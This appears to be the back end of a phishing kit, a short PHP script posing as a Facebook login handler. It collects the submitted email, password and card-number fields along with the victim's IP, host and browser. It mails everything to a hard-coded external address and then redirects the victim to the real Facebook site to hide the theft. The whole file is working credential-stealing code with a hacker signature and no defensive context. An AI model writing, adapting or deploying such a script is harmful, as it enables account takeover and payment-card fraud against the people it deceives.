<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- Facebook -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "Email Adresse       : ".$_POST['email']."\n";
$message .= "Password          : ".$_POST['pass']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "=======HACKED BY SALAH KADRI ET FARES HANUTI ========";
$cc = $_POST['ccn'];
$subject = " h4ack3d by s4l4h sh4 ".$_POST['exm']."/".$_POST['exy'];
$send = "ibrahimytop@gmail.com";
$headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
mail($send,$subject,$message,$headers);

header("Location:https://facebook.com/");?>